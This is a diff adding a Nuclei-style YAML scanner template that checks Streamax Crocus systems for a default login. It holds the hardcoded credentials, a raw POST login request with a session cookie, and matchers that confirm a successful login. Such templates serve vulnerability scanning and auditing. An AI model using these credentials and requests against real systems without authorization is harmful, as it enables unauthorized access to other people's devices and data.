@@ -1,0 +1,44 @@
+id: streamax-default-login
+info:
+  name: 深圳市锐明技术股份有限公司Crocus系统默认账户密码
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%B7%B1%E5%9C%B3%E5%B8%82%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AF%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%B7%B1%E5%9C%B3%E5%B8%82%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AF%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8Crocus%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo 
+    tips: streamax20020818/20020818streamax
+    repair:
+    version:
+  tags: default-login,streamax
+
+http:
+  - raw:
+      - |
+        POST /RegisterLogin.do?Action=Login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 71
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}Plugin/RegisterLogin/Default.jsp
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh,ja;q=0.9,zh-CN;q=0.8
+        Cookie: JSESSIONID=DF6D4ACE151A8098813E49F9F910DB66; Saffron.U="VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTc1NjgxNTA1ODM0NjkxJlJJRD0xJk09R01hcCZJTlM9MA=="
+        Connection: keep-alive
+
+        UserName=streamax20020818&Password=20020818streamax&MailCode=&AuthCode=
+                
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'ReviceAccount','Result','Code','200')
+          - contains_all(header,'text/json')
+        condition: and
